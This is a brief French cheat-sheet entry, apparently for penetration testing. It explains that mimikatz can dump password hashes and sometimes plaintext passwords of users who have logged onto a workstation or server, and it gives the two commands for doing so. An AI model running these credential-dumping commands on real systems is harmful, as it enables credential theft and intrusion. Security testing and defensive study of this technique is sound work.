# Session utilisateur

Avec l'outil `mimikatz`, il est possible d'obtenir les _hashs_ et parfois les mots de passe des utilisateurs s'étant connecté à un poste bureautique ou serveur.

```
privilege::debug
sekurlsa::logonpasswords
```
